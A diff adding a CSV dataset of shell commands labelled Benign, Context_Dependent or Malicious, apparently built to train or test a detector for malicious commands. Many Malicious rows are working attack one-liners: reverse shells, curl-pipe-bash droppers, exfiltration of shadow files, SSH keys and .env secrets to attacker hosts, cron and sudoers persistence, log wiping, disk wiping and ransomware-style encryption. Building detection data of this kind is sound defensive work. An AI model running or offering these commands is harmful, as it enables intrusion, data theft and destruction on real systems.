@@ -1,0 +1,1461 @@
+command,label,original_label,mitre_id
+head -50 /var/log/auth.log,Benign,Synthetic,Synthetic
+cat /etc/sudoers.d/README,Benign,Synthetic,Synthetic
+namei -l /var/www/html/index.html,Benign,Synthetic,Synthetic
+kubectl get deployments,Benign,Synthetic,Synthetic
+systemctl start docker,Benign,Synthetic,Synthetic
+vim /var/www/nginx.conf,Benign,Synthetic,Synthetic
+journalctl -f,Benign,Synthetic,Synthetic
+grep -ri api_key /home/,Context_Dependent,Synthetic,Synthetic
+nslookup internal-dns,Benign,Synthetic,Synthetic
+dd if=/dev/mem of=/tmp/mem.dump bs=1M count=100,Context_Dependent,Synthetic,Synthetic
+systemctl status fail2ban,Benign,Synthetic,Synthetic
+dotnet build,Benign,Synthetic,Synthetic
+pip show django,Benign,Synthetic,Synthetic
+grep -i 'failed' /var/log/syslog,Benign,Synthetic,Synthetic
+git push origin feature-branch,Benign,Synthetic,Synthetic
+pip install --upgrade flask,Benign,Synthetic,Synthetic
+echo 'kernel.core_pattern=|/tmp/exploit' > /etc/sysctl.d/99-exploit.conf,Malicious,Synthetic,Synthetic
+echo '*/5 * * * * curl http://10.0.0.1/beacon | bash' >> /var/spool/cron/root,Malicious,Synthetic,Synthetic
+curl -I https://lb-01,Benign,Synthetic,Synthetic
+"python3 -c 'import base64; print(base64.b64decode(""dGVzdA==""))'",Context_Dependent,Synthetic,Synthetic
+git stash list,Benign,Synthetic,Synthetic
+grep -i 'traceback' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+pstree,Benign,Synthetic,Synthetic
+ssh -D 3306 user@server,Context_Dependent,Synthetic,Synthetic
+vim /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
+base64 /etc/sudoers | curl -d @- http://172.16.5.10:1234/,Malicious,Synthetic,Synthetic
+findmnt,Benign,Synthetic,Synthetic
+jq '.' config.json,Benign,Synthetic,Synthetic
+ls -la /etc/systemd/system/,Benign,Synthetic,Synthetic
+logrotate -d /etc/logrotate.conf,Benign,Synthetic,Synthetic
+printf '%s\n' 'test',Benign,Synthetic,Synthetic
+grep -i 'WARN' /var/log/syslog,Benign,Synthetic,Synthetic
+git stash pop,Benign,Synthetic,Synthetic
+cp /opt/app/backup.sh /opt/app/backup.sh.bak,Benign,Synthetic,Synthetic
+date +%Y-%m-%d,Benign,Synthetic,Synthetic
+atrm 1,Benign,Synthetic,Synthetic
+cat /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
+cal,Benign,Synthetic,Synthetic
+host -t AAAA google.com,Benign,Synthetic,Synthetic
+chmod g+rw shared/,Benign,Synthetic,Synthetic
+ssh ubuntu@production,Benign,Synthetic,Synthetic
+curl http://10.10.14.3:9090/rev.py | bash,Malicious,Synthetic,Synthetic
+cp /home/admin/Dockerfile /home/admin/Dockerfile.bak,Benign,Synthetic,Synthetic
+yarn install,Benign,Synthetic,Synthetic
+base64 -d encoded.txt,Benign,Synthetic,Synthetic
+docker inspect api,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:4444,fork -",Context_Dependent,Synthetic,Synthetic
+md5sum backup.tar.gz,Benign,Synthetic,Synthetic
+wget http://172.16.0.50:8080/dropper -O /run/shm/dropper && chmod +x /run/shm/dropper && /run/shm/dropper,Malicious,Synthetic,Synthetic
+nc -e /bin/bash 172.16.0.1 9090,Malicious,Synthetic,Synthetic
+ssh user@192.168.1.10,Benign,Synthetic,Synthetic
+docker start web,Benign,Synthetic,Synthetic
+wget http://10.0.0.1/shell.sh -O /tmp/shell.sh,Context_Dependent,Synthetic,Synthetic
+nano /opt/services/Makefile,Benign,Synthetic,Synthetic
+ls -lah /var/www/html,Benign,Synthetic,Synthetic
+ssh ubuntu@staging 'uptime',Benign,Synthetic,Synthetic
+ls -lt /opt/services | head -10,Benign,Synthetic,Synthetic
+groupadd developers,Benign,Synthetic,Synthetic
+cat /etc/security/opasswd,Malicious,Synthetic,Synthetic
+mv /home/admin/Dockerfile.old /home/admin/Dockerfile,Benign,Synthetic,Synthetic
+systemctl restart kibana,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/sudoers http://10.10.14.3:1337/exfil,Malicious,Synthetic,Synthetic
+cp /var/log/package.json /var/log/package.json.bak,Benign,Synthetic,Synthetic
+nano /home/user/server.js,Benign,Synthetic,Synthetic
+openssl s_client -quiet -connect 10.0.0.1:4444|/bin/bash|openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
+gcc -o main main.c,Benign,Synthetic,Synthetic
+ip route,Benign,Synthetic,Synthetic
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
+cat /opt/app/.env | nc 192.168.56.1 6666,Malicious,Synthetic,Synthetic
+systemctl restart rsyslog,Benign,Synthetic,Synthetic
+mv /etc/nginx/monitor.py.old /etc/nginx/monitor.py,Benign,Synthetic,Synthetic
+pip install --upgrade sqlalchemy,Benign,Synthetic,Synthetic
+systemctl status docker,Benign,Synthetic,Synthetic
+ssh -R 8080:localhost:8080 user@external,Context_Dependent,Synthetic,Synthetic
+nbtscan 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
+chmod 600 backup.sh,Benign,Synthetic,Synthetic
+uname -r,Benign,Synthetic,Synthetic
+curl -s http://10.100.200.1/payload.sh -o /tmp/.payload.sh && bash /tmp/.payload.sh,Malicious,Synthetic,Synthetic
+curl -X POST -d @/var/www/html/.env http://172.16.5.10:7777/exfil,Malicious,Synthetic,Synthetic
+volatility -f mem.dump imageinfo,Context_Dependent,Synthetic,Synthetic
+find / -name '*.conf' -exec grep -l password {} \;,Context_Dependent,Synthetic,Synthetic
+lsof -i :22,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:8443,fork -",Context_Dependent,Synthetic,Synthetic
+whereis python3,Benign,Synthetic,Synthetic
+grep -i 'failed' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+strings /dev/sda | grep password,Context_Dependent,Synthetic,Synthetic
+timedatectl status,Benign,Synthetic,Synthetic
+systemctl is-active apache2,Benign,Synthetic,Synthetic
+systemctl status redis,Benign,Synthetic,Synthetic
+john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt,Malicious,Synthetic,Synthetic
+pip install --upgrade celery,Benign,Synthetic,Synthetic
+mv /tmp/main.go.old /tmp/main.go,Benign,Synthetic,Synthetic
+bash -i >& /dev/tcp/10.10.14.3/8080 0>&1,Malicious,Synthetic,Synthetic
+nc -e /bin/sh 10.0.0.1 4444,Malicious,Synthetic,Synthetic
+chgrp developers /shared/project,Benign,Synthetic,Synthetic
+ssh-agent bash,Benign,Synthetic,Synthetic
+journalctl -u sshd --no-pager -n 20,Benign,Synthetic,Synthetic
+pip install --upgrade gunicorn,Benign,Synthetic,Synthetic
+df -hT,Benign,Synthetic,Synthetic
+wget http://10.0.0.1/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd,Malicious,Synthetic,Synthetic
+journalctl -u elasticsearch --no-pager -n 20,Benign,Synthetic,Synthetic
+ssh -D 1080 user@server,Context_Dependent,Synthetic,Synthetic
+usermod -aG docker $USER,Benign,Synthetic,Synthetic
+nano /home/deploy/index.html,Benign,Synthetic,Synthetic
+pip install numpy,Benign,Synthetic,Synthetic
+sudo ufw allow 80/tcp,Benign,Synthetic,Synthetic
+curl -X POST -d @/home/user/.ssh/id_rsa http://10.0.0.5:31337/exfil,Malicious,Synthetic,Synthetic
+cat /etc/ssh/ssh_config,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:9001,fork -",Context_Dependent,Synthetic,Synthetic
+printenv | grep -i aws,Context_Dependent,Synthetic,Synthetic
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:4443,fork -",Context_Dependent,Synthetic,Synthetic
+python3 -m http.server 9000,Context_Dependent,Synthetic,Synthetic
+docker network inspect bridge,Benign,Synthetic,Synthetic
+uname -m,Benign,Synthetic,Synthetic
+netstat -rn,Benign,Synthetic,Synthetic
+base64 /etc/ssh/sshd_config | curl -d @- http://10.100.200.1:9001/,Malicious,Synthetic,Synthetic
+docker-compose down,Benign,Synthetic,Synthetic
+head -100 /var/log/nginx/access.log,Benign,Synthetic,Synthetic
+export HISTFILE=/dev/null,Malicious,Synthetic,Synthetic
+vim /home/user/projects/config.yaml,Benign,Synthetic,Synthetic
+curl -X POST -d @/opt/app/.env http://192.168.56.1:6666/exfil,Malicious,Synthetic,Synthetic
+systemctl list-units --type=service --state=running,Benign,Synthetic,Synthetic
+md5sum image.iso,Benign,Synthetic,Synthetic
+nano /var/www/nginx.conf,Benign,Synthetic,Synthetic
+docker logs -f worker,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/shadow http://192.168.0.10:4444/exfil,Malicious,Synthetic,Synthetic
+openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem,Benign,Synthetic,Synthetic
+python -m SimpleHTTPServer 8888,Context_Dependent,Synthetic,Synthetic
+dd if=/dev/urandom of=/dev/sda bs=4M,Malicious,Synthetic,Synthetic
+chown -R root:root /home/user,Benign,Synthetic,Synthetic
+nc -zv 192.168.1.1 1-1000,Context_Dependent,Synthetic,Synthetic
+systemctl restart haproxy,Benign,Synthetic,Synthetic
+cp /srv/www/app.py /srv/www/app.py.bak,Benign,Synthetic,Synthetic
+"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:9001",Malicious,Synthetic,Synthetic
+docker logs --tail 200 worker,Benign,Synthetic,Synthetic
+grep -ri 'token' /etc/,Context_Dependent,Synthetic,Synthetic
+curl http://10.0.0.1/payload.sh | bash,Malicious,Synthetic,Synthetic
+vim /var/www/index.html,Benign,Synthetic,Synthetic
+kubectl exec -it web-abc123 -- bash,Benign,Synthetic,Synthetic
+rm -rf /home/ /var/ /etc/,Malicious,Synthetic,Synthetic
+head -50 /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
+curl -X POST -d @/root/.ssh/id_rsa http://192.168.1.100:1337/exfil,Malicious,Synthetic,Synthetic
+pstree -p,Benign,Synthetic,Synthetic
+id -u,Benign,Synthetic,Synthetic
+ps auxww,Benign,Synthetic,Synthetic
+apt update,Benign,Synthetic,Synthetic
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
+git rebase main,Benign,Synthetic,Synthetic
+find / -name '*.conf' -exec grep -l 'password' {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
+git clean -fd,Benign,Synthetic,Synthetic
+echo '/var/tmp/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
+git switch main,Benign,Synthetic,Synthetic
+echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned,Malicious,Synthetic,Synthetic
+chmod -R 755 /var/www/html,Benign,Synthetic,Synthetic
+chown -R www-data:www-data /opt/services,Benign,Synthetic,Synthetic
+echo '' > /var/log/syslog,Malicious,Synthetic,Synthetic
+vim /var/www/html/package.json,Benign,Synthetic,Synthetic
+cat /etc/ssh/sshd_config,Benign,Synthetic,Synthetic
+vim /home/admin/healthcheck.sh,Benign,Synthetic,Synthetic
+socat TCP4:10.0.0.1:4444 EXEC:/bin/bash,Malicious,Synthetic,Synthetic
+nmap -sn 10.10.10.0/24,Context_Dependent,Synthetic,Synthetic
+docker inspect cache,Benign,Synthetic,Synthetic
+vim /var/log/docker-compose.yml,Benign,Synthetic,Synthetic
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,Malicious,Synthetic,Synthetic
+vim /srv/www/backup.sh,Benign,Synthetic,Synthetic
+mv /tmp/malware /usr/lib/libpam.so.1,Malicious,Synthetic,Synthetic
+md5sum -c checksums.md5,Benign,Synthetic,Synthetic
+du -sh /home/user/projects,Benign,Synthetic,Synthetic
+wget -q http://dl.xmrig.com/xmrig -O /dev/shm/.proc && nohup /dev/shm/.proc --donate-level 0 -o pool.hashvault.pro:80 &,Malicious,Synthetic,Synthetic
+vim /home/deploy/deploy.sh,Benign,Synthetic,Synthetic
+brew update,Benign,Synthetic,Synthetic
+readlink -f /usr/bin/python3,Benign,Synthetic,Synthetic
+nano /var/lib/main.go,Benign,Synthetic,Synthetic
+openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc,Context_Dependent,Synthetic,Synthetic
+ncat -lvnp 9001,Context_Dependent,Synthetic,Synthetic
+last -a,Benign,Synthetic,Synthetic
+nc -zv 192.168.0.10 22,Context_Dependent,Synthetic,Synthetic
+wget http://172.16.0.1:8080/beacon.sh -O /dev/shm/.proc/beacon.sh && chmod +x /dev/shm/.proc/beacon.sh && /dev/shm/.proc/beacon.sh,Malicious,Synthetic,Synthetic
+kubectl get pods,Benign,Synthetic,Synthetic
+chmod 664 README.md,Benign,Synthetic,Synthetic
+curl -o /dev/null -w '%{http_code}' https://example.com,Benign,Synthetic,Synthetic
+userdel olduser,Benign,Synthetic,Synthetic
+chown -R deploy:deploy /var/log,Benign,Synthetic,Synthetic
+sudo -i,Benign,Synthetic,Synthetic
+pip install boto3,Benign,Synthetic,Synthetic
+for user in $(cat /etc/passwd | cut -d: -f1); do crontab -l -u $user 2>/dev/null; done,Malicious,Synthetic,Synthetic
+hostname -I,Benign,Synthetic,Synthetic
+ls /home/admin/,Benign,Synthetic,Synthetic
+chmod 755 Makefile,Benign,Synthetic,Synthetic
+curl -sSL http://10.0.0.1/dropper.sh | bash -s --,Malicious,Synthetic,Synthetic
+tail -20 /etc/redis/redis.conf,Benign,Synthetic,Synthetic
+chown -R root:root /var/www/html,Benign,Synthetic,Synthetic
+ping -c 1 localhost,Benign,Synthetic,Synthetic
+grep -i 'traceback' /var/log/syslog,Benign,Synthetic,Synthetic
+"python3 -c 'import base64; print(base64.b64encode(b""test""))'",Context_Dependent,Synthetic,Synthetic
+du -ah /var/lib | sort -rh | head -10,Benign,Synthetic,Synthetic
+ps aux | grep python,Benign,Synthetic,Synthetic
+tail -20 /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
+ls /home/user/projects/,Benign,Synthetic,Synthetic
+docker stop web,Benign,Synthetic,Synthetic
+docker logs -f web,Benign,Synthetic,Synthetic
+mimikatz.exe,Malicious,Synthetic,Synthetic
+nc -zv 172.16.5.10 22,Context_Dependent,Synthetic,Synthetic
+lsmem,Benign,Synthetic,Synthetic
+journalctl -u nginx --no-pager -n 20,Benign,Synthetic,Synthetic
+systemctl restart apache2,Benign,Synthetic,Synthetic
+vgs,Benign,Synthetic,Synthetic
+nmap -sT 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
+lsof -i :443,Benign,Synthetic,Synthetic
+curl http://10.0.0.5:9090/rev.py | bash,Malicious,Synthetic,Synthetic
+dig +short google.com,Benign,Synthetic,Synthetic
+systemctl restart nginx,Benign,Synthetic,Synthetic
+grep -r 'password' /etc/,Context_Dependent,Synthetic,Synthetic
+systemctl status nginx,Benign,Synthetic,Synthetic
+nc -lvnp 4443,Context_Dependent,Synthetic,Synthetic
+sudo systemctl restart nginx,Benign,Synthetic,Synthetic
+seq 1 10,Benign,Synthetic,Synthetic
+echo $SHELL,Benign,Synthetic,Synthetic
+docker restart web,Benign,Synthetic,Synthetic
+apt remove nginx,Benign,Synthetic,Synthetic
+cp /var/www/monitor.py /var/www/monitor.py.bak,Benign,Synthetic,Synthetic
+cp /var/www/html/package.json /var/www/html/package.json.bak,Benign,Synthetic,Synthetic
+nmap -sT 10.10.10.0/24,Context_Dependent,Synthetic,Synthetic
+find /tmp -type f -atime +7 -exec rm {} \;,Benign,Synthetic,Synthetic
+ssh -o StrictHostKeyChecking=no root@10.0.0.2 'curl http://10.0.0.1/shell|bash',Malicious,Synthetic,Synthetic
+cp /srv/www/backup.sh /srv/www/backup.sh.bak,Benign,Synthetic,Synthetic
+git bisect good v1.0,Benign,Synthetic,Synthetic
+journalctl -u fail2ban --since '1 hour ago',Benign,Synthetic,Synthetic
+journalctl -u nomad --no-pager -n 20,Benign,Synthetic,Synthetic
+ssh ubuntu@production 'uptime',Benign,Synthetic,Synthetic
+curl -X POST -d @/root/.ssh/id_rsa http://10.10.14.5:5555/exfil,Malicious,Synthetic,Synthetic
+chown -R deploy:deploy /srv/www,Benign,Synthetic,Synthetic
+nano /var/www/Dockerfile,Benign,Synthetic,Synthetic
+nc -lvnp 7777,Context_Dependent,Synthetic,Synthetic
+cat /etc/hostname | base64,Context_Dependent,Synthetic,Synthetic
+cp /var/log/index.html /var/log/index.html.bak,Benign,Synthetic,Synthetic
+nano /home/deploy/healthcheck.sh,Benign,Synthetic,Synthetic
+stat -c %U:%G /etc/passwd,Benign,Synthetic,Synthetic
+ln -sf /dev/null ~/.bash_history,Malicious,Synthetic,Synthetic
+mv /srv/www/backup.sh.old /srv/www/backup.sh,Benign,Synthetic,Synthetic
+curl http://172.16.0.1:8080/implant | bash,Malicious,Synthetic,Synthetic
+cat /etc/environment,Benign,Synthetic,Synthetic
+ls -la /tmp/,Benign,Synthetic,Synthetic
+nano /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
+ssh -L 8080:localhost:80 user@server,Benign,Synthetic,Synthetic
+dotnet run,Benign,Synthetic,Synthetic
+grep -ri 'api_key' /etc/,Context_Dependent,Synthetic,Synthetic
+mv /opt/services/settings.json.old /opt/services/settings.json,Benign,Synthetic,Synthetic
+base64 /var/www/html/.env | curl -d @- http://172.16.5.10:7777/,Malicious,Synthetic,Synthetic
+ls -lah /var/www,Benign,Synthetic,Synthetic
+screen -ls,Benign,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://172.16.0.50/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+git commit --amend --no-edit,Benign,Synthetic,Synthetic
+git log --graph --oneline -20,Benign,Synthetic,Synthetic
+vim /srv/www/nginx.conf,Benign,Synthetic,Synthetic
+nc -e /bin/bash 192.168.56.1 4444,Malicious,Synthetic,Synthetic
+grep -c 'failed' /var/log/syslog,Benign,Synthetic,Synthetic
+dig MX google.com,Benign,Synthetic,Synthetic
+grep -ri 'token' /srv/,Context_Dependent,Synthetic,Synthetic
+cp /srv/www/Makefile /srv/www/Makefile.bak,Benign,Synthetic,Synthetic
+curl -s http://192.168.1.50/shell.sh -o /run/shm/.shell.sh && bash /run/shm/.shell.sh,Malicious,Synthetic,Synthetic
+journalctl -u vault --no-pager -n 20,Benign,Synthetic,Synthetic
+systemctl status httpd,Benign,Synthetic,Synthetic
+cat /home/*/.ssh/id_rsa 2>/dev/null,Malicious,Synthetic,Synthetic
+git stash,Benign,Synthetic,Synthetic
+pip freeze,Benign,Synthetic,Synthetic
+journalctl -u httpd --no-pager -n 20,Benign,Synthetic,Synthetic
+echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,Context_Dependent,Synthetic,Synthetic
+chown -R www-data:www-data /srv/www,Benign,Synthetic,Synthetic
+cat /var/www/html/.env | nc 172.16.5.10 7777,Malicious,Synthetic,Synthetic
+mv /home/user/projects/README.md.old /home/user/projects/README.md,Benign,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * /tmp/.backdoor') | crontab -,Malicious,Synthetic,Synthetic
+chown www-data:www-data /srv/www,Benign,Synthetic,Synthetic
+grep -i 'Exception' /var/log/syslog,Benign,Synthetic,Synthetic
+scp user@server:/var/log/app.log .,Benign,Synthetic,Synthetic
+curl http://172.16.5.10:443/agent | bash,Malicious,Synthetic,Synthetic
+mv /var/log/index.html.old /var/log/index.html,Benign,Synthetic,Synthetic
+cat /etc/sudoers | nc 10.10.14.3 1337,Malicious,Synthetic,Synthetic
+nano /srv/www/settings.json,Benign,Synthetic,Synthetic
+du -sh /var/www,Benign,Synthetic,Synthetic
+finger $USER,Benign,Synthetic,Synthetic
+gobuster dir -u http://target.com -w wordlist.txt,Context_Dependent,Synthetic,Synthetic
+flask run --host=0.0.0.0,Benign,Synthetic,Synthetic
+nano /home/user/config.yaml,Benign,Synthetic,Synthetic
+journalctl -u consul --no-pager -n 20,Benign,Synthetic,Synthetic
+make install,Benign,Synthetic,Synthetic
+journalctl --since '1 hour ago',Benign,Synthetic,Synthetic
+ssh -L 1080:localhost:1080 user@jump,Context_Dependent,Synthetic,Synthetic
+wget -q http://attacker.com/miner -O /dev/shm/.hidden && bash /dev/shm/.hidden,Malicious,Synthetic,Synthetic
+journalctl -u elasticsearch --since '1 hour ago',Benign,Synthetic,Synthetic
+ncat -lvnp 31337,Context_Dependent,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://10.0.0.5/31337/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+cp /etc/nginx/deploy.sh /etc/nginx/deploy.sh.bak,Benign,Synthetic,Synthetic
+docker restart cache,Benign,Synthetic,Synthetic
+ls -la /etc/init.d/,Benign,Synthetic,Synthetic
+echo '/run/shm/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
+chmod 664 healthcheck.sh,Benign,Synthetic,Synthetic
+vim /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
+mv /etc/nginx/deploy.sh.old /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
+nano /var/www/monitor.py,Benign,Synthetic,Synthetic
+set +o history,Malicious,Synthetic,Synthetic
+nc -zv 192.168.1.1 22,Context_Dependent,Synthetic,Synthetic
+docker ps -a,Benign,Synthetic,Synthetic
+pkill -f 'monitoring',Context_Dependent,Synthetic,Synthetic
+systemctl status apache2,Benign,Synthetic,Synthetic
+ssh deploy@production,Benign,Synthetic,Synthetic
+grep -i 'WARN' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
+du -sh /srv/www,Benign,Synthetic,Synthetic
+chown nginx:nginx /home/admin,Benign,Synthetic,Synthetic
+ssh deploy@app-01 'uptime',Benign,Synthetic,Synthetic
+find / -name '*.pem' 2>/dev/null,Context_Dependent,Synthetic,Synthetic
+docker volume ls,Benign,Synthetic,Synthetic
+journalctl -u redis --no-pager -n 20,Benign,Synthetic,Synthetic
+docker rm old-container,Benign,Synthetic,Synthetic
+find /home -maxdepth 2 -name '.bashrc',Benign,Synthetic,Synthetic
+fail2ban-client status,Benign,Synthetic,Synthetic
+ls -lt /var/www | head -10,Benign,Synthetic,Synthetic
+cp /etc/nginx/monitor.py /etc/nginx/monitor.py.bak,Benign,Synthetic,Synthetic
+ss -tuln,Benign,Synthetic,Synthetic
+chkconfig --list,Benign,Synthetic,Synthetic
+mv /home/deploy/requirements.txt.old /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
+yum list installed,Benign,Synthetic,Synthetic
+ping -c 4 internal-dns,Benign,Synthetic,Synthetic
+loginctl show-session 1,Benign,Synthetic,Synthetic
+journalctl -u memcached --since '1 hour ago',Benign,Synthetic,Synthetic
+journalctl -u docker --no-pager -n 50,Benign,Synthetic,Synthetic
+grep -ri 'secret' /srv/,Context_Dependent,Synthetic,Synthetic
+du -ah /var/log | sort -rh | head -10,Benign,Synthetic,Synthetic
+pvs,Benign,Synthetic,Synthetic
+ncat -lvnp 4444,Context_Dependent,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://172.16.5.10/1234/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+chmod 700 Dockerfile,Benign,Synthetic,Synthetic
+find /var/www -user www-data -type f,Benign,Synthetic,Synthetic
+less /var/log/kern.log,Benign,Synthetic,Synthetic
+ls -lah /var/log,Benign,Synthetic,Synthetic
+strings /proc/*/environ 2>/dev/null | grep -i pass,Malicious,Synthetic,Synthetic
+ssh admin@app-01,Benign,Synthetic,Synthetic
+ssh -D 6379 user@server,Context_Dependent,Synthetic,Synthetic
+bash -i >& /dev/tcp/10.20.30.40/7777 0>&1,Malicious,Synthetic,Synthetic
+nano /srv/www/app.py,Benign,Synthetic,Synthetic
+du -sh /etc/nginx,Benign,Synthetic,Synthetic
+vim /home/admin/Dockerfile,Benign,Synthetic,Synthetic
+cp /var/log/docker-compose.yml /var/log/docker-compose.yml.bak,Benign,Synthetic,Synthetic
+curl -s http://172.16.0.1/implant -o /tmp/.hidden/.implant && bash /tmp/.hidden/.implant,Malicious,Synthetic,Synthetic
+journalctl -u fail2ban --no-pager -n 20,Benign,Synthetic,Synthetic
+mv /opt/app/app.py.old /opt/app/app.py,Benign,Synthetic,Synthetic
+openssl enc -aes-256-cbc -salt -in /home/user/important.doc -out /home/user/important.doc.enc -k ransomkey && rm /home/user/important.doc,Malicious,Synthetic,Synthetic
+nc -zv 192.168.1.100 1-1000,Context_Dependent,Synthetic,Synthetic
+pip install redis,Benign,Synthetic,Synthetic
+systemctl status rsyslog,Benign,Synthetic,Synthetic
+pgrep -la python,Benign,Synthetic,Synthetic
+journalctl -u postgresql --since '1 hour ago',Benign,Synthetic,Synthetic
+mv /home/user/monitor.py.old /home/user/monitor.py,Benign,Synthetic,Synthetic
+du -ah /home/admin | sort -rh | head -10,Benign,Synthetic,Synthetic
+tcpdump -i eth0,Context_Dependent,Synthetic,Synthetic
+chage -l $USER,Benign,Synthetic,Synthetic
+curl -X POST -d @/etc/passwd http://10.0.0.1:8080/exfil,Malicious,Synthetic,Synthetic
+vim /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
+mv /home/user/nginx.conf.old /home/user/nginx.conf,Benign,Synthetic,Synthetic
+cp /var/www/nginx.conf /var/www/nginx.conf.bak,Benign,Synthetic,Synthetic
+borgbackup create ::archive /home,Benign,Synthetic,Synthetic
+loginctl list-sessions,Benign,Synthetic,Synthetic
+systemctl is-enabled sshd,Benign,Synthetic,Synthetic
+docker exec api ls /app,Benign,Synthetic,Synthetic
+chmod u+x script.sh,Benign,Synthetic,Synthetic
+pip install pandas,Benign,Synthetic,Synthetic
+ssh -L 3306:localhost:3306 user@jump,Context_Dependent,Synthetic,Synthetic
+docker logs --tail 200 db,Benign,Synthetic,Synthetic
+ssh -D 8080 user@server,Context_Dependent,Synthetic,Synthetic
+/bin/sh -i >& /dev/tcp/192.168.1.100/1337 0>&1,Malicious,Synthetic,Synthetic
+tee output.log,Benign,Synthetic,Synthetic
+ip -6 addr,Benign,Synthetic,Synthetic
+python3 -m http.server 8000,Context_Dependent,Synthetic,Synthetic
+curl -s http://172.16.5.10/dropper -o /dev/shm/.proc/.dropper && bash /dev/shm/.proc/.dropper,Malicious,Synthetic,Synthetic
+ifconfig,Benign,Synthetic,Synthetic
+echo 0 > /proc/sys/kernel/modules_disabled && insmod /tmp/evil.ko,Malicious,Synthetic,Synthetic
+vim /opt/services/README.md,Benign,Synthetic,Synthetic
+journalctl -u cron --since '1 hour ago',Benign,Synthetic,Synthetic
+unset HISTFILE,Malicious,Synthetic,Synthetic
+grep -r 'password' /var/www/,Context_Dependent,Synthetic,Synthetic
+systemctl restart sshd,Benign,Synthetic,Synthetic
+sha256sum backup.tar.gz,Benign,Synthetic,Synthetic
+ls -lah /home/user/projects,Benign,Synthetic,Synthetic
+curl -s http://10.10.14.3/rev.py -o /tmp/.rev.py && bash /tmp/.rev.py,Malicious,Synthetic,Synthetic
+"nmap -p 22,80,443 192.168.1.1",Context_Dependent,Synthetic,Synthetic
+git bisect bad HEAD,Benign,Synthetic,Synthetic
+vim /var/log/config.yaml,Benign,Synthetic,Synthetic
+xxd -r hexfile,Context_Dependent,Synthetic,Synthetic
+echo '' > /var/log/auth.log,Malicious,Synthetic,Synthetic
+ip neigh,Benign,Synthetic,Synthetic
+docker logs app,Benign,Synthetic,Synthetic
+dig google.com,Benign,Synthetic,Synthetic
+grep -ri 'token' /var/www/,Context_Dependent,Synthetic,Synthetic
+systemctl is-active docker,Benign,Synthetic,Synthetic
+md5sum important_file.tar.gz,Benign,Synthetic,Synthetic
+go test ./...,Benign,Synthetic,Synthetic
+journalctl -u rsyslog --no-pager -n 20,Benign,Synthetic,Synthetic
+usermod -aG sudo backdoor,Malicious,Synthetic,Synthetic
+grep -ri 'db_password\|db_pass\|mysql_pwd' /var/www/,Malicious,Synthetic,Synthetic
+df -h /home/user,Benign,Synthetic,Synthetic
+cp /home/user/projects/README.md /home/user/projects/README.md.bak,Benign,Synthetic,Synthetic
+wget http://192.168.1.50:80/shell.sh -O /run/shm/shell.sh && chmod +x /run/shm/shell.sh && /run/shm/shell.sh,Malicious,Synthetic,Synthetic
+dmidecode -t bios,Benign,Synthetic,Synthetic
+yum install -y httpd,Benign,Synthetic,Synthetic
+cat /proc/meminfo,Benign,Synthetic,Synthetic
+rsync -avz /home/user/ /backup/user/,Benign,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://10.0.0.1/8080/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+kill -HUP $(pidof java),Benign,Synthetic,Synthetic
+pip show numpy,Benign,Synthetic,Synthetic
+cat ~/.bash_history,Context_Dependent,Synthetic,Synthetic
+shuf -i 1-100 -n 5,Benign,Synthetic,Synthetic
+w -h,Benign,Synthetic,Synthetic
+nano /var/log/config.yaml,Benign,Synthetic,Synthetic
+curl -s http://attacker.com/implant | sh,Malicious,Synthetic,Synthetic
+vim /var/www/html/settings.json,Benign,Synthetic,Synthetic
+"ps -eo pid,ppid,cmd,%mem,%cpu",Benign,Synthetic,Synthetic
+docker ps,Benign,Synthetic,Synthetic
+kubectl get svc,Benign,Synthetic,Synthetic
+ls -la /etc/nginx/sites-enabled/,Benign,Synthetic,Synthetic
